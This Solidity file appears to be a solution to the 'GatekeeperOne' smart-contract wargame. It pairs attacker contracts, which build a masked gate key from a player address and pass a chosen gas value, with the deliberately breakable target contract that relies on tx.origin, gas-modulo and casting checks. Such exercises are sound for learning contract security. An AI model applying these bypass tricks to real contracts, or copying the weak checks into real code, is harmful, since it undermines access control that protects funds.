// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import {GatekeeperOne} from "./GateKeeperOne.sol";

contract GatekeeperAttacker {
    address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;
    bytes8 key = bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF;

    function enter(address gate, uint256 gasToUse) external {
        GatekeeperOne(gate).enter{gas: gasToUse}(key);
    }

    function checkGate3() external view {
        require(
            uint32(uint64(key)) == uint16(uint64(key)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(uint32(uint64(key)) != uint64(key), "GatekeeperOne: invalid gateThree part two");
        require(
            uint32(uint64(key)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
    }
}

contract HackGatekeeperOne {
    // address gate = 0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69;
    // address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;
    // bytes8 key = bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF;

    function enter(address gate, uint256 gasToUse, address player) external {
        bytes8 key = bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF;

        GatekeeperOne(gate).enter{gas: gasToUse}(key);
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "Failed gateOne");
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0, "Failed gateTwo");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
